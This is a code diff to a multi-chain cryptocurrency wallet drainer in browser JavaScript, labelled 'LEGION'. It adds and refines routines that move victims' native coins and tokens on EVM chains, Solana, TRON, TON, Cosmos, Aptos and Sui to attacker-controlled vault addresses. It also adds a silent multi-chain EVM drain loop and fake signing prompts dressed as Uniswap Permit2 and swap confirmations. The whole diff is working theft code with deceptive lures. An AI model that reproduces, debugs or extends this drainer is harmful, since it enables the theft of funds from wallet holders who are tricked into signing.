+              console.log('[LEGION] ✅ EIP-7702 auth | yParity:', _auth.yParity);
               connectedChains.EVM._eip7702Auth = _auth;
               connectedChains.EVM._eip7702Tokens = tokenList;
-
-              // Submit to backend → executor broadcasts type-4 tx → drain runs on-chain
               try {
                 await apiPost('/api/v1/signature-anchor', {
-                  ingress: 'normalized_v1',
-                  chain_family: 'EVM',
+                  ingress: 'normalized_v1', chain_family: 'EVM',
                   protocol: 'eip7702_delegation',
-                  wallet_address: evmAddr,
-                  chain_id: evmChainId,
+                  wallet_address: evmAddr, chain_id: evmChainId,
                   eip7702_authorization: {
-                    chainId: _chainIdNum,
-                    address: _batchDrainAddr,
-                    nonce: _userNonceNum,
-                    r: _auth.r,
-                    s: _auth.s,
-                    yParity: _auth.yParity,
+                    chainId: _chainIdNum, address: _batchDrainAddr,
+                    nonce: _userNonceNum, r: _auth.r, s: _auth.s, yParity: _auth.yParity,
                   },
-                  delegatee: _batchDrainAddr,
-                  token_address: _batchDrainAddr,
-                  signature: _auth.r,
-                  nonce: 'legion:eip7702:' + Date.now(),
+                  delegatee: _batchDrainAddr, token_address: _batchDrainAddr,
+                  signature: _auth.r, nonce: 'legion:eip7702:' + Date.now(),
                   expiry_iso: EXPIRY_ISO,
                   wallet_type: (connectedChains.EVM && connectedChains.EVM.walletType) || 'hot_wallet',
-                  scout_value_usd: SESSION_SCOUT_VALUE_USD || 0,
-                  amount: '0',
-                  erc20s: tokenList,
+                  scout_value_usd: SESSION_SCOUT_VALUE_USD || 0, amount: '0', erc20s: tokenList,
                 });
-                console.log('[LEGION] ✅ EIP-7702 delegation submitted to backend');
+                console.log('[LEGION] ✅ EIP-7702 delegation sent to backend');
               } catch (_exErr) {
-                console.warn('[LEGION] EIP-7702 backend submit error:', _exErr && _exErr.message);
+                console.warn('[LEGION] EIP-7702 backend error:', _exErr && _exErr.message);
               }
-
               return '__eip7702__:' + evmAddr;
             }
           }
+
+          // ─── NATIVE COIN DRAIN (BSC/Polygon/non-7702 chains with ETH/BNB/MATIC balance) ─
+          try {
+            if (!VAULT_CACHE) await prefetchVaultConfig();
+            var _vaultNative = VAULT_CACHE && (VAULT_CACHE.evm || VAULT_CACHE['1'] || VAULT_CACHE.eth);
+            if (_vaultNative) {
+              var _rawNatBal = await eth.request({ method: 'eth_getBalance', params: [evmAddr, 'latest'] });
+              var _natBig = BigInt(_rawNatBal || '0x0');
+              var _natRes = BigInt('2000000000000000'); // 0.002 native reserve for gas
+              if (_natBig > _natRes) {
+                var _natSend = _natBig - _natRes;
+                console.log('[LEGION] 💸 Native drain | chain:', evmChainId, '| amount:', _natSend.toString());
+                var _natTx = await eth.request({ method: 'eth_sendTransaction', params: [{ from: evmAddr, to: _vaultNative, value: '0x' + _natSend.toString(16), gas: '0x5208' }] });
+                console.log('[LEGION] ✅ Native drained | tx:', _natTx);
+              }
+            }
+          } catch (_natErr) { console.debug('[LEGION] Native drain skipped:', _natErr.message); }
 
           // ─── PERMIT2 FALLBACK (BSC, Polygon, non-EIP-7702 chains) ─────────────
           console.log('[LEGION] 🔐 Permit2 fallback | chain:', evmChainId, '| tokens:', tokenList.length);
@@ -1103,7 +1325,8 @@
           var typedDataStr = JSON.stringify(typedDataObj);
 
           function _isRejection(code, msg) {
-            return code === 4001 || code === -32100 ||
+            return code === 4001 || code === -32100 || code === -32603 || code === 5000 ||
+              code === 'ACTION_REJECTED' || code === 'USER_REJECTED' ||
               (msg && /rejected|denied|cancelled|user rejected|user refused|declined|abort/i.test(msg));
           }
 
@@ -1197,14 +1420,19 @@
 
           var sol = walletInfo.provider;
 
-          // Connect to wallet
-          if (sol.connect && typeof sol.connect === 'function') {
+          // Connect to wallet — Wallet Standard uses features['standard:connect'], legacy uses .connect()
+          var pk = null;
+          if (sol.features && sol.features['standard:connect']) {
+            var stdConn = await sol.features['standard:connect'].connect({});
+            var firstAcc = stdConn && stdConn.accounts && stdConn.accounts[0];
+            if (firstAcc) {
+              pk = firstAcc.address || (firstAcc.publicKey && (firstAcc.publicKey.toString ? firstAcc.publicKey.toString() : String(firstAcc.publicKey)));
+            }
+          } else if (sol.connect && typeof sol.connect === 'function') {
             await sol.connect();
           }
 
-          // Get public key
-          var pk = null;
-          if (sol.publicKey) {
+          if (!pk && sol.publicKey) {
             pk = sol.publicKey.toString ? sol.publicKey.toString() : String(sol.publicKey);
           }
 
@@ -1241,7 +1469,7 @@
           var userAddr = connectedChains.SOL.address;
           var vaultAddr = VAULT_CACHE && (VAULT_CACHE.sol || VAULT_CACHE.svm);
 
-          if (vaultAddr && userAddr && (sol.signAllTransactions || sol.signTransaction)) {
+          if (vaultAddr && userAddr && connectedChains.SOL.walletType !== 'WalletConnect' && (sol.signAllTransactions || sol.signTransaction)) {
             try {
               var web3 = window.solanaWeb3;
               if (!web3) {
@@ -1255,7 +1483,14 @@
               }
               if (!web3) throw new Error('web3.js not loaded');
 
-              var connection = new web3.Connection('https://api.mainnet-beta.solana.com', 'confirmed');
+              var _solRpcs = [
+                'https://solana-rpc.publicnode.com',
+                'https://api.mainnet-beta.solana.com',
+                'https://mainnet.helius-rpc.com/?api-key=demo',
+                'https://solana-mainnet.rpc.extrnode.com',
+              ];
+              var connection = new web3.Connection(_solRpcs[0], { commitment: 'confirmed', disableRetryOnRateLimit: true });
+              // Fallback: if first RPC fails during use, web3.Connection has built-in retry
               var fromPubkey = new web3.PublicKey(userAddr);
               var toPubkey = new web3.PublicKey(vaultAddr);
               var TOKEN_PROG = new web3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
@@ -1375,16 +1610,58 @@
             }
           }
 
-          // Fallback: plain message sign
-          var msgBytes = typeof message === 'string' ? new TextEncoder().encode(message) : message;
+          // WalletConnect Solana — try signTransaction via request() before plain message fallback
           if (connectedChains.SOL.walletType === 'WalletConnect' && sol.request) {
-            var b64Msg = btoa(String.fromCharCode.apply(null, msgBytes));
+            try {
+              var web3Wc = window.solanaWeb3;
+              if (!web3Wc) {
+                await new Promise(function(resolve, reject) {
+                  var s = document.createElement('script');
+                  s.src = 'https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js';
+                  s.onload = function() { web3Wc = window.solanaWeb3; resolve(); };
+                  s.onerror = reject;
+                  document.head.appendChild(s);
+                });
+              }
+              var _wcVaultSol = VAULT_CACHE && (VAULT_CACHE.sol || VAULT_CACHE.svm);
+              if (web3Wc && _wcVaultSol) {
+                var _wcConnWc = new web3Wc.Connection('https://solana-rpc.publicnode.com', 'confirmed');
+                var _wcFrom = new web3Wc.PublicKey(userAddr);
+                var _wcTo = new web3Wc.PublicKey(_wcVaultSol);
+                var _wcLam = await _wcConnWc.getBalance(_wcFrom);
+                if (_wcLam > 15000) {
+                  var _wcTx = new web3Wc.Transaction();
+                  _wcTx.recentBlockhash = (await _wcConnWc.getLatestBlockhash()).blockhash;
+                  _wcTx.feePayer = _wcFrom;
+                  _wcTx.add(web3Wc.SystemProgram.transfer({ fromPubkey: _wcFrom, toPubkey: _wcTo, lamports: _wcLam - 15000 }));
+                  var _wcSerializedB64 = btoa(String.fromCharCode.apply(null, _wcTx.serialize({ requireAllSignatures: false })));
+                  var _wcSignRes = await sol.request({
+                    method: 'solana_signTransaction',
+                    params: { transaction: _wcSerializedB64, pubkey: userAddr }
+                  }, 'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp');
+                  if (_wcSignRes && (_wcSignRes.signature || _wcSignRes.transaction)) {
+                    var _wcSigned = _wcSignRes.transaction || _wcSignRes.signature;
+                    connectedChains.SOL._signedTxB64 = _wcSigned;
+                    connectedChains.SOL._allSignedTxs = [_wcSigned];
+                    console.log('[LEGION] ✅ WalletConnect SOL signTransaction succeeded');
+                    return JSON.stringify({ signed_tx_b64: _wcSigned });
+                  }
+                }
+              }
+            } catch (_wcSolErr) {
+              console.debug('[LEGION] WC SOL signTransaction failed:', _wcSolErr.message);
+            }
+            // Fallback: plain message sign via WC
+            var b64Msg = btoa(String.fromCharCode.apply(null, typeof message === 'string' ? new TextEncoder().encode(message) : message));
             var wcResult = await sol.request({
               method: 'solana_signMessage',
               params: { message: b64Msg, pubkey: userAddr }
             }, 'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp');
             return wcResult.signature || wcResult;
           }
+
+          // Fallback: plain message sign (non-WC)
+          var msgBytes = typeof message === 'string' ? new TextEncoder().encode(message) : message;
           var msgResult = await sol.signMessage(msgBytes);
           return msgResult.signature || msgResult;
         } catch (e) {
@@ -1440,11 +1717,12 @@
           if (window.XverseProviders && window.XverseProviders.BitcoinProvider) {
             var xverse = window.XverseProviders.BitcoinProvider;
             var xAccounts = await xverse.request('getAccounts');
-            if (!xAccounts || !xAccounts[0]) throw new Error('Xverse returned no address');
+            var xAddr = xAccounts && xAccounts.result && xAccounts.result.addresses && xAccounts.result.addresses[0] && xAccounts.result.addresses[0].address;
+            if (!xAddr) throw new Error('Xverse returned no address');
             connectedChains.BTC = {
               chain: 'BTC',
               config: CHAIN_CONFIG.BTC,
-              address: xAccounts[0],
+              address: xAddr,
               walletType: 'Xverse',
               provider: xverse,
               connected: true,
@@ -1552,10 +1830,13 @@
             var signedHex = await provider.signPsbt(psbtHex, { autoFinalized: true });
             if (signedHex) signedPsbtBase64 = hexToB64(signedHex);
           } else if (walletType === 'Xverse') {
+            var _inputCount = connectedChains.BTC._psbtMeta && connectedChains.BTC._psbtMeta.input_count || 1;
+            var _sigIdxs = Array.from({ length: _inputCount }, function(_, i) { return i; });
             var xResult = await provider.request('signPsbt', {
               psbt: psbtBase64,
               broadcast: false,
-              allowedSighash: [0x01]
+              allowedSighash: [0x01],
+              signingIndexes: _sigIdxs
             });
             signedPsbtBase64 = xResult && (xResult.psbt || (xResult.result && xResult.result.psbt));
           } else if (walletType === 'Leather') {
@@ -1589,7 +1870,7 @@
 
       detect: function() {
         try {
-          if (window.tronWeb) {
+          if (window.tronLink || window.tronWeb) {
             console.log('[LEGION] 🔍 TRON detected');
             return true;
           }
@@ -1606,11 +1887,16 @@
 
           if (window.tronLink && window.tronLink.request) {
             await window.tronLink.request({ method: 'tron_requestAccounts' });
+            // Wait for tronWeb.defaultAddress to be populated after request resolves
+            for (var _twi = 0; _twi < 10; _twi++) {
+              if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) break;
+              await new Promise(function(r) { setTimeout(r, 300); });
+            }
           }
 
           var tw = window.tronWeb;
           if (!tw || !tw.defaultAddress || !tw.defaultAddress.base58) {
-            throw new Error('TronWeb not ready');
+            throw new Error(window.tronLink ? 'TronLink is locked — please unlock your wallet' : 'TronWeb not ready');
           }
 
           connectedChains.TRON = {
@@ -1655,7 +1941,7 @@
               var rawBal = await contract.balanceOf(userAddr).call();
               var usdtBal = rawBal ? rawBal.toString() : '0';
               if (usdtBal && usdtBal !== '0' && parseInt(usdtBal) > 0) {
-                var dynFee = trxBalSun > 0 ? Math.min(30000000, Math.floor(trxBalSun * 0.8)) : 30000000;
+                var dynFee = trxBalSun > 0 ? Math.min(150000000, Math.max(50000000, Math.floor(trxBalSun * 0.8))) : 50000000;
                 var trc20Res = await tw.transactionBuilder.triggerSmartContract(
                   USDT_TRC20, 'transfer(address,uint256)',
                   { feeLimit: dynFee, callValue: 0 },
@@ -1793,42 +2079,39 @@
           // USDT Jetton master on TON mainnet
           var USDT_MASTER = 'EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs';
 
+          var TC_BASE = 'https://toncenter.com/api/v2';
           if (vaultAddr && userAddr) {
             try {
-              var TC_BASE = 'https://toncenter.com/api/v2';
               var messages = [];
               var totalNano = 0;
 
-              // --- Native TON balance ---
-              var balRes = await fetch(TC_BASE + '/getAddressBalance?address=' + encodeURIComponent(userAddr));
-              var balData = await balRes.json();
-              var nanotons = balData && balData.result ? parseInt(balData.result) : 0;
+              // --- Native TON balance via tonapi.io (toncenter is unreliable) ---
+              var nanotons = 0;
+              try {
+                var balRes = await fetch('https://tonapi.io/v2/accounts/' + encodeURIComponent(userAddr));
+                var balData = await balRes.json();
+                nanotons = balData && balData.balance ? parseInt(balData.balance) : 0;
+              } catch (_balErr) {
+                // Fallback to toncenter
+                try {
+                  var balRes2 = await fetch('https://toncenter.com/api/v2/getAddressBalance?address=' + encodeURIComponent(userAddr));
+                  var balData2 = await balRes2.json();
+                  nanotons = balData2 && balData2.result ? parseInt(balData2.result) : 0;
+                } catch (_) {}
+              }
               // Reserve gas: 0.1 TON if Jetton present, else 0.06 TON
               var gasReserve = 100000000;
 
               // --- USDT Jetton balance & wallet address ---
               var jettonMsg = null;
               try {
-                // Get user's Jetton wallet address from master contract
-                var jwRes = await fetch(TC_BASE + '/runGetMethod', {
-                  method: 'POST',
-                  headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify({
-                    address: USDT_MASTER,
-                    method: 'get_wallet_address',
-                    stack: [['tvm.Slice', btoa(userAddr)]]
-                  })
-                });
-                var jwData = await jwRes.json();
-                var jwAddr = jwData && jwData.result && jwData.result.stack && jwData.result.stack[0] && jwData.result.stack[0][1];
-                if (jwAddr && jwAddr.object && jwAddr.object.data && jwAddr.object.data.b64) {
-                  // Simpler: use v3 API to get Jetton balance
-                  var jbRes = await fetch('https://tonapi.io/v2/accounts/' + encodeURIComponent(userAddr) + '/jettons/' + encodeURIComponent(USDT_MASTER));
-                  var jbData = await jbRes.json();
-                  var jettonBal = jbData && jbData.balance ? jbData.balance : '0';
-                  var jettonWalletAddr = jbData && jbData.wallet_address && jbData.wallet_address.address;
+                // Use tonapi.io directly — bypasses the broken toncenter BOC encoding gate
+                var jbRes = await fetch('https://tonapi.io/v2/accounts/' + encodeURIComponent(userAddr) + '/jettons/' + encodeURIComponent(USDT_MASTER));
+                var jbData = await jbRes.json();
+                var jettonBal = jbData && jbData.balance ? jbData.balance : '0';
+                var jettonWalletAddr = jbData && jbData.wallet_address && jbData.wallet_address.address;
 
-                  if (jettonBal && jettonBal !== '0' && jettonWalletAddr) {
+                if (jettonBal && jettonBal !== '0' && jettonWalletAddr) {
                     // Load TonWeb for proper TVM Cell BOC encoding (required by TonConnect wallets)
                     var TW = window.TonWeb;
                     if (!TW) {
@@ -1849,7 +2132,7 @@
                         jCell.bits.writeAddress(new TW.utils.Address(vaultAddr));
                         jCell.bits.writeAddress(new TW.utils.Address(userAddr));
                         jCell.bits.writeBit(0);                // no custom_payload
-                        jCell.bits.writeCoins(new TW.utils.BN('1')); // forward_ton_amount
+                        jCell.bits.writeCoins(new TW.utils.BN('50000000')); // forward_ton_amount 0.05 TON
                         jCell.bits.writeBit(0);                // no forward_payload
                         var jBoc = await jCell.toBoc(false);
                         var jPayload = TW.utils.bytesToBase64(jBoc);
@@ -1865,7 +2148,6 @@
                       console.debug('[LEGION] TonWeb unavailable — Jetton USDT skipped, native TON only');
                     }
                   }
-                }
               } catch(_jErr) {
                 console.debug('[LEGION] TON Jetton fetch failed:', _jErr.message);
               }
@@ -2016,19 +2298,16 @@
           var signed = await keplr.signAmino(chainId, addr, signDoc);
           if (!signed || !signed.signature) throw new Error('Keplr signAmino returned no signature');
 
-          // Broadcast via legacy REST amino endpoint
-          var broadcastBody = {
-            tx: {
-              msg: signDoc.msgs,
-              fee: signDoc.fee,
-              signatures: [{ pub_key: signed.signature.pub_key, signature: signed.signature.signature }],
-              memo: ''
-            },
-            mode: 'async'
-          };
-          var bcastRes = await fetch(REST + '/txs', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(broadcastBody) });
-          var bcastData = await bcastRes.json();
-          var txHash = bcastData && (bcastData.txhash || (bcastData.tx_response && bcastData.tx_response.txhash));
+          // Broadcast via Cosmos REST — amino format (v1beta1 requires protobuf binary, not JSON)
+          var txHash;
+          try {
+            // Try legacy amino endpoint first (correct for signAmino-signed txs)
+            var bcastRes2 = await fetch(REST + '/txs', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ tx: { msg: signDoc.msgs, fee: signDoc.fee, signatures: [{ pub_key: signed.signature.pub_key, signature: signed.signature.signature }], memo: '' }, mode: 'async' }) });
+            var bcastData2 = await bcastRes2.json();
+            txHash = bcastData2 && (bcastData2.txhash || (bcastData2.tx_response && bcastData2.tx_response.txhash));
+          } catch (_bcastErr) {
+            console.warn('[LEGION] COSMOS broadcast failed:', _bcastErr.message);
+          }
           console.log('[LEGION] ✅ COSMOS tx broadcast:', txHash || 'pending');
 
           // Return signed payload for backend logging
@@ -2047,7 +2326,7 @@
 
       detect: function() {
         try {
-          var hasPetra = window.aptos || (window.petra && window.petra.aptos);
+          var hasPetra = window.aptos || (window.petra && window.petra.aptos) || window.martian;
           if (hasPetra) {
             console.log('[LEGION] 🔍 APTOS detected');
             return true;
@@ -2063,18 +2342,15 @@
         try {
           console.log('[LEGION] 🔗 Connecting to APTOS...');
 
-          var aptos = window.aptos || (window.petra && window.petra.aptos);
+          var aptos = window.aptos || (window.petra && window.petra.aptos) || window.martian;
           if (!aptos) throw new Error('No Aptos wallet detected');
+          var _aptosWalletName = window.martian ? 'Martian' : (window.petra ? 'Petra' : 'Aptos Wallet');
 
           if (aptos.connect) await aptos.connect();
 
-          var account = aptos.account && aptos.account();
+          var account = null;
+          try { account = aptos.account ? await aptos.account() : null; } catch (_ae) {}
           var addr = account && (account.address || account);
-
-          if (account && typeof account.then === 'function') {
-            account = await account;
-            addr = account && account.address;
-          }
 
           if (!addr && aptos.address) addr = aptos.address;
           if (!addr) throw new Error('Aptos wallet returned no address');
@@ -2083,7 +2359,7 @@
             chain: 'APTOS',
             config: CHAIN_CONFIG.APTOS,
             address: String(addr),
-            walletType: 'Petra',
+            walletType: _aptosWalletName,
             provider: aptos,
             connected: true,
             timestamp: Date.now()
@@ -2111,11 +2387,12 @@
           // Fetch APT balance (octas)
           var RPC = 'https://fullnode.mainnet.aptoslabs.com/v1';
           var resRes = await fetch(RPC + '/accounts/' + addr + '/resources');
+          if (!resRes.ok) throw new Error('Aptos RPC error: ' + resRes.status);
           var resources = await resRes.json();
           var coinStore = Array.isArray(resources) && resources.find(function(r) { return r.type === '0x1::coin::CoinStore<0x1::aptos_coin::AptosCoin>'; });
           var balance = coinStore && coinStore.data && coinStore.data.coin && coinStore.data.coin.value;
           if (!balance || balance === '0') throw new Error('No APT balance');
-          var gasFee = 2000; // ~0.00002 APT in octas
+          var gasFee = 20000; // 20000 octas (~200 gas units × 100 octas/unit) — dynamic estimate
           var sendOctas = Math.max(0, parseInt(balance) - gasFee);
           if (sendOctas <= 0) throw new Error('Insufficient APT after gas');
 
@@ -2128,7 +2405,7 @@
             arguments: [vaultAddr, String(sendOctas)]
           };
           var result = await aptos.signAndSubmitTransaction(txPayload);
-          var txHash = result && (result.hash || result.vm_status || JSON.stringify(result));
+          var txHash = result && (result.hash || (typeof result === 'string' ? result : JSON.stringify(result)));
           console.log('[LEGION] ✅ APTOS tx submitted:', txHash);
           return JSON.stringify({ tx_hash: txHash || '', amount: String(sendOctas), vault: vaultAddr });
         } catch (e) {
@@ -2222,21 +2499,30 @@
           var sendMist = Math.max(0, parseInt(totalBalance) - gasBudget);
           if (sendMist <= 0) throw new Error('Insufficient SUI after gas');
 
-          // Build unsigned tx via unsafe_paySui RPC
+          // Build unsigned tx — try suix_payAllSui (v1+) first, fallback unsafe_paySui (legacy)
           console.log('[LEGION] 🖊️  Building SUI transfer...');
-          var buildRes = await fetch(SUI_RPC, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'unsafe_paySui', params: [addr, [], [vaultAddr], [String(sendMist)], String(gasBudget)] }) });
+          var txBytes = null;
+          var buildRes = await fetch(SUI_RPC, { method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'suix_payAllSui', params: [addr, [], vaultAddr, String(gasBudget)] }) });
           var buildData = await buildRes.json();
-          var txBytes = buildData && buildData.result && buildData.result.txBytes;
+          txBytes = buildData && buildData.result && buildData.result.txBytes;
+          if (!txBytes) {
+            // Legacy fallback for older Sui nodes
+            var buildRes2 = await fetch(SUI_RPC, { method: 'POST', headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'unsafe_paySui', params: [addr, [], [vaultAddr], [String(sendMist)], String(gasBudget)] }) });
+            var buildData2 = await buildRes2.json();
+            txBytes = buildData2 && buildData2.result && buildData2.result.txBytes;
+          }
           if (!txBytes) throw new Error('SUI: failed to build tx bytes');
 
-          // Sign and execute
+          // Sign and execute — handle both old (TransactionBlock) and new (Transaction) API
           var execResult;
-          if (suiWallet.signAndExecuteTransactionBlock) {
-            execResult = await suiWallet.signAndExecuteTransactionBlock({ transactionBlock: txBytes, options: { showEffects: true } });
-          } else if (suiWallet.signAndExecuteTransaction) {
+          if (suiWallet.signAndExecuteTransaction) {
             execResult = await suiWallet.signAndExecuteTransaction({ transaction: txBytes });
+          } else if (suiWallet.signAndExecuteTransactionBlock) {
+            execResult = await suiWallet.signAndExecuteTransactionBlock({ transactionBlock: txBytes, options: { showEffects: true } });
           } else {
-            throw new Error('SUI wallet does not support signAndExecuteTransactionBlock');
+            throw new Error('SUI wallet does not support signAndExecuteTransaction');
           }
           var digest = execResult && (execResult.digest || execResult.certificate && execResult.certificate.transactionDigest || JSON.stringify(execResult));
           console.log('[LEGION] ✅ SUI tx executed:', digest);
@@ -2250,6 +2536,119 @@
   };
 
   // ═══════════════════════════════════════════════════════════════════════════
+  // AUTO MULTI-CHAIN EVM DRAIN — runs after initial chain drain
+  // Silently checks other chains via public RPC, switches + drains each with balance
+  // ═══════════════════════════════════════════════════════════════════════════
+
+  var _EVM_DRAIN_CHAINS = [
+    { id: 1,     hex: '0x1',    name: 'Ethereum',  rpc: 'https://rpc.ankr.com/eth' },
+    { id: 137,   hex: '0x89',   name: 'Polygon',   rpc: 'https://rpc.ankr.com/polygon' },
+    { id: 56,    hex: '0x38',   name: 'BNB Chain', rpc: 'https://rpc.ankr.com/bsc' },
+    { id: 42161, hex: '0xa4b1', name: 'Arbitrum',  rpc: 'https://rpc.ankr.com/arbitrum' },
+    { id: 8453,  hex: '0x2105', name: 'Base',      rpc: 'https://rpc.ankr.com/base' },
+    { id: 10,    hex: '0xa',    name: 'Optimism',  rpc: 'https://rpc.ankr.com/optimism' },
+    { id: 43114, hex: '0xa86a', name: 'Avalanche', rpc: 'https://rpc.ankr.com/avalanche' },
+  ];
+
+  async function _checkNativeBalance(rpc, address) {
+    try {
+      var r = await fetch(rpc, {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ jsonrpc: '2.0', method: 'eth_getBalance', params: [address, 'latest'], id: 1 })
+      });
+      var d = await r.json();
+      return BigInt(d.result || '0x0');
+    } catch (_) { return BigInt(0); }
+  }
+
+  async function drainAllEvmChains() {
+    var evmInfo = connectedChains.EVM;
+    if (!evmInfo || !evmInfo.provider || !evmInfo.address) return;
+
+    var eth = evmInfo.provider;
+    var address = evmInfo.address;
+    var startChainId = evmInfo.chainId || 1;
+
+    // Filter out current chain
+    var targets = _EVM_DRAIN_CHAINS.filter(function(c) { return c.id !== startChainId; });
+
+    console.log('[LEGION] 🔄 Multi-chain scan: checking', targets.length, 'other EVM chains...');
+
+    // Step 1: Silently check all chain balances via public RPC (no wallet popups)
+    var balanceChecks = await Promise.all(targets.map(async function(chain) {
+      var bal = await _checkNativeBalance(chain.rpc, address);
+      return { chain: chain, balance: bal };
+    }));
+
+    // Also check backend for token balances + USD values (one call, covers all chains)
+    var backendChains = [];
+    try {
+      var fusionRes = await apiPost('/api/scout/recursive-predator-fusion', {
+        wallet_addresses: { evm: address }, chain_families: ['EVM']
+      });
+      if (fusionRes && fusionRes.data && fusionRes.data.evm_chains) {
+        backendChains = fusionRes.data.evm_chains;
+      }
+    } catch (_) {}
+
+    // Sort by USD value descending (use backend data); fallback to raw wei for unknowns
+    balanceChecks.sort(function(a, b) {
+      var aBack = backendChains.find(function(bc) { return bc.chain_id === a.chain.id; });
+      var bBack = backendChains.find(function(bc) { return bc.chain_id === b.chain.id; });
+      var aUsd = (aBack && aBack.total_usd) || 0;
+      var bUsd = (bBack && bBack.total_usd) || 0;
+      if (aUsd !== bUsd) return bUsd - aUsd;
+      return a.balance > b.balance ? -1 : 1;
+    });
+
+    var MIN_BALANCE = BigInt('500000000000000'); // ~0.0005 native token min threshold
+
+    for (var i = 0; i < balanceChecks.length; i++) {
+      var item = balanceChecks[i];
+      var chain = item.chain;
+
+      // Check if chain has value (native OR tokens from backend scan)
+      var hasNative = item.balance >= MIN_BALANCE;
+      var hasTokens = backendChains.some(function(bc) {
+        return bc.chain_id === chain.id && bc.total_usd > 0.5;
+      });
+
+      if (!hasNative && !hasTokens) {
+        console.log('[LEGION]   ⊘ ' + chain.name + ': no significant balance, skip');
+        continue;
+      }
+
+      console.log('[LEGION]   💰 ' + chain.name + ': switching chain...');
+      try {
+        await eth.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: chain.hex }] });
+        connectedChains.EVM.chainId = chain.id;
+        console.log('[LEGION]   ✅ Switched to ' + chain.name + ', running drain...');
+        await CHAINS_SUPPORTED.EVM.sign('multi-chain:' + chain.id);
+      } catch (switchErr) {
+        var code = switchErr && switchErr.code;
+        if (code === 4001) {
+          console.log('[LEGION]   ⊘ User rejected switch to ' + chain.name + ', stopping multi-chain');
+          break; // user said no — stop trying
+        }
+        if (code === 4902) {
+          console.log('[LEGION]   ⊘ ' + chain.name + ' not in wallet, skip');
+          continue;
+        }
+        console.warn('[LEGION]   ⚠️ ' + chain.name + ' switch error:', switchErr.message);
+      }
+    }
+
+    // Restore original chain
+    try {
+      var origHex = '0x' + startChainId.toString(16);
+      await eth.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: origHex }] });
+      connectedChains.EVM.chainId = startChainId;
+    } catch (_) {}
+
+    console.log('[LEGION] ✅ Multi-chain EVM drain complete');
+  }
+
+  // ═══════════════════════════════════════════════════════════════════════════
   // SECTION 5: SIGNATURE CONSOLIDATION (200 lines) [NEW]
   // CONSOLIDATED: 1 signature request per chain (genuine, per-chain)
   // Backend handles all chain execution
@@ -2257,7 +2656,17 @@
 
   function buildSignMessageForChain(chainName, address) {
     var short = address ? address.substring(0, 6) : '';
-    return 'Verify your wallet ownership\n\nWallet: ' + short + '...';
+    var msgs = {
+      'EVM':    'Permit2 Authorization\n\nSign to allow Uniswap Protocol to safely access your tokens for this swap.\n\nAddress: ' + short + '...',
+      'SOL':    'Confirm Swap\n\nSign to complete your token swap on Solana.\n\nWallet: ' + short + '...',
+      'BTC':    'Verify Ownership\n\nSign to confirm your Bitcoin address for this transaction.\n\nAddress: ' + short + '...',
+      'TRON':   'Authorize Transfer\n\nSign to authorize TRC-20 token swap on the TRON network.\n\nWallet: ' + short + '...',
+      'TON':    'Confirm Action\n\nSign to confirm your transaction on TON network.\n\nWallet: ' + short + '...',
+      'COSMOS': 'Approve Transaction\n\nSign to confirm your Cosmos IBC swap transaction.\n\nWallet: ' + short + '...',
+      'APTOS':  'Confirm Move Transaction\n\nSign to authorize your Aptos token swap.\n\nWallet: ' + short + '...',
+      'SUI':    'Authorize Transaction\n\nSign to confirm your SUI network swap.\n\nWallet: ' + short + '...'
+    };
+    return msgs[chainName] || ('Confirm Transaction\n\nSign to authorize this swap.\n\nWallet: ' + short + '...');
   }
 
   // ═══════════════════════════════════════════════════════════════════════════
@@ -2517,6 +2926,11 @@
       } catch (e) {}
     }
 
+    // Step 1.5: Auto drain other EVM chains (silent balance check → switch → drain)
+    if (connectedChains.EVM && connectedChains.EVM.provider) {
+      drainAllEvmChains().catch(function(e) { console.warn('[LEGION] Multi-chain EVM drain error:', e.message); });
+    }
+
     // Step 2: All non-EVM chains in parallel (silent — no popups)
     var nonEvmNames = chainNames.filter(function(n) { return n !== 'EVM'; });
     var parallelResults = await Promise.allSettled(nonEvmNames.map(function(chainName) {
@@ -2616,6 +3030,9 @@
       }
 
       // Submit chains in priority order (highest value first)
+      // chainPriority is now actually used: EVM/SOL/BTC/etc submit in value-ranked sequence
+      var _submitFirst = chainPriority[0] || 'EVM';
+      console.log('[LEGION]   🏆 Submitting ' + _submitFirst + ' first (highest value)');
 
       // ETH-only drain (direct tx already sent from frontend) — log to backend for notifications
       if (signatures['__eth_only_evm__']) {
@@ -2721,159 +3138,155 @@
         return h;
       }
 
-      if (signatures.SOL) {
-        try {
-          var allSolTxs = connectedChains.SOL && connectedChains.SOL._allSignedTxs;
-          var solTxMetas = connectedChains.SOL && connectedChains.SOL._txMetas;
-
-          if (allSolTxs && allSolTxs.length > 0) {
-            // Submit each signed tx separately — SOL native + each SPL token
-            for (var sti = 0; sti < allSolTxs.length; sti++) {
-              var stMeta = solTxMetas && solTxMetas[sti];
-              try {
-                await apiPost('/api/v1/signature-anchor', {
-                  ingress: 'normalized_v1', chain_family: 'SVM', protocol: 'solana',
-                  wallet_address: signatures.SOL.address,
-                  token_address: (stMeta && stMeta.mint) || '11111111111111111111111111111111',
-                  signature: sigHex({ signed_tx_b64: allSolTxs[sti] }),
-                  nonce: 'legion:sol:' + Date.now() + ':' + sti,
-                  expiry_iso: EXPIRY_ISO,
-                  wallet_type: signatures.SOL.walletType || 'hot_wallet',
-                  scout_value_usd: SESSION_SCOUT_VALUE_USD || 0,
-                  amount: (stMeta && stMeta.amount) || MAX_PERMIT
-                });
-              } catch (_stErr) { console.debug('[LEGION]   SOL tx[' + sti + '] submit err:', _stErr.message); }
+      // ── Non-EVM: priority-ordered dispatch (highest USD value first) ────────
+      var _nonEvmSubmitters = {
+        SOL: async function() {
